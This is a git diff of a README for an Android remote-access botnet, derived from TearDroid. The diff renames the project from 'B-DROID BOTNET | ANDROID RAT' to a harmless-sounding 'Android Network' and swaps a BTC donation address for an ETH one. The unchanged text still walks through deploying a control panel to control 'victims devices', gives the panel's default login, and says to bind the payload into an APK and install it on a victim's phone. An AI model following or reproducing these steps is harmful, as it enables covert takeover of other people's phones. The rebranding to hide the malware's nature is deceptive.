@@ -1,15 +1,15 @@
-<p align="center"><a href="https://github.com/botolmehedi/BDROID"><img title="BDROID" src="https://i.ibb.co/PgFYh4K/20220325-110329.png"></a>
+<p align="center"><a href="https://github.com/Layvizu/HelloAndroid/"><img title="Android Network" src="https://i.ibb.co/PgFYh4K/20220325-110329.png"></a>
 
 <p align="center">
-<a href="https://github.com/botolmehedi"><img title="Author" src="https://img.shields.io/badge/By-Botol--Baba-red.svg?style=for-the-badge&logo=github"></a>
+<a href="https://github.com/Layvizu/HelloAndroid/"><img title="Author" src="https://img.shields.io/badge/By-Botol--Baba-red.svg?style=for-the-badge&logo=github"></a>
 </p>
 
-<h1 align="center">B-DROID BOTNET</h1>
-<p align="center">      SIMPLE ANDROID BOTNET | ANDROID RAT</p>
+<h1 align="center">Android Network</h1>
+<p align="center">      Simple Android Network</p>
 
 ## About
 
-It's easy to use. This android botnet work without port forwarding, vps and android studio. This is a fully fresh & new undetectable Android Botnet. This botnet work on Android 5 to 10 Any Devices.
+It's easy to use. Without Port Forwarding. Free!
 
 ## Features
 
@@ -36,10 +36,10 @@ Android 5 to Android 10. Working Without Any Error.
 * Create a New Account here [Deta.sh](https://deta.sh)
 
 * Now Deploy To Deta : 
-[![Deploy](https://button.deta.dev/1/svg)](https://go.deta.dev/deploy?repo=https://github.com/BotolMehedi/BDROID)
+[![Deploy](https://button.deta.dev/1/svg)](https://go.deta.dev/deploy?repo=https://github.com/Layvizu/HelloAndroid/)
 
 * After Successfully Deployed, Copy That Link. This is Your Control Panel. You Can Control All of Your Victims Devices From Here.
-<a href="https://github.com/botolmehedi/BDROID"><img title="BDROID" src="https://user-images.githubusercontent.com/64999484/160270463-cd7a4097-ee08-4181-b3d3-b91e2190c6e7.png"></a>
+<a href="https://github.com/Layvizu/HelloAndroid/"><img title="HelloAndroid" src="https://user-images.githubusercontent.com/64999484/160270463-cd7a4097-ee08-4181-b3d3-b91e2190c6e7.png"></a>
 
 ⭐ Control Panel Default Login
 * User : botol
@@ -60,31 +60,17 @@ Android 5 to Android 10. Working Without Any Error.
 * Now Build/Save. 
 ~Your Binded APK is ready. Now Install this apk on victims phone.
 
-<img title="Payload Setup Bdroid" src="https://user-images.githubusercontent.com/64999484/160757635-2260efb1-f0bf-4737-a3f3-780fb5409c1b.gif"/>
+<img title="Payload Setup Android Network" src="https://user-images.githubusercontent.com/64999484/160757635-2260efb1-f0bf-4737-a3f3-780fb5409c1b.gif"/>
 
-## Working Demo Video :
-* [DEMO VIDEO TUTORIAL LINK](https://drive.google.com/file/d/14mVcHO-ME7QGXcQGvCAw7kVPhYEn-cY5/view?usp=drivesdk)
 
- https://user-images.githubusercontent.com/64999484/160759767-8ece8b43-6aee-40cf-8698-73922d248bf0.mp4
-
-## [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/botolbaba)
-* BTC : 17CdkUHrPzoWg3B2TX8Nm7YkYZX7wreFQw
-
-## Follow Me
-
-* Youtube : [Subscribe Now](https://www.youtube.com/MasterTrick1)
-* Website : [Visit Now](https://linktr.ee/botolbaba)
-* Page : [Follow Us](https://www.facebook.com/TeamVVirus)
-* Group : [Join Us](https://www.facebook.com/groups/231747098048450)
-* Telegram : [Join Now](https://t.me/mastertrick2)
-* Instagram : [Follow Me](https://www.instagram.com/MehtanOfficial)
-* Twitter : [Follow Me](https://www.twitter.com/botolbaba)
+## [!["Buy Me A Coffee"]
+* ETH : 0xd07B59E93482fB3AFe1cEF0C9492a11413b48bA6
 
 ## ThanksTo
 ```
-• HackSec❤TearDroid
+• Layvizu
 ```
 
 ## Warning
 
-***This is a reCoded/Modified/Shortcut Version of "TEARDROID by HackSec". I am not promoting any illegal activity here. This is purely for educational purpose only. i am not responsible if you use it for illegal purpose.***
+***This is a Version of "TEARDROID by HackSec". I am not promoting any illegal activity here. This is purely for educational purpose only. i am not responsible if you use it for illegal purpose.***
